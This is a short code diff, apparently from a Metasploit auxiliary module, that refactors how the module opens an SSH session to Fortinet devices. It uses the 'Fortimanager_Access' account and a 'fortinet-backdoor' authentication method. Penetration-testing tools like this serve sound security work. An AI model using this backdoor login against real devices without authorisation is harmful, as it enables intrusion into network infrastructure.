@@ -53,20 +53,18 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run_host(ip)
-    factory = ssh_socket_factory
-
-    ssh_opts = ssh_client_defaults.merge({
+    ssh_opts = {
       port: rport,
       # The auth method is converted into a class name for instantiation,
       # so fortinet-backdoor here becomes FortinetBackdoor from the mixin
       auth_methods: ['fortinet-backdoor']
-    })
+    }
 
     ssh_opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']
 
     begin
       ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
-        Net::SSH.start(ip, 'Fortimanager_Access', ssh_opts)
+        connect_ssh(ip, 'Fortimanager_Access', ssh_opts)
       end
     rescue Net::SSH::Exception => e
       vprint_error("#{ip}:#{rport} - #{e.class}: #{e.message}")
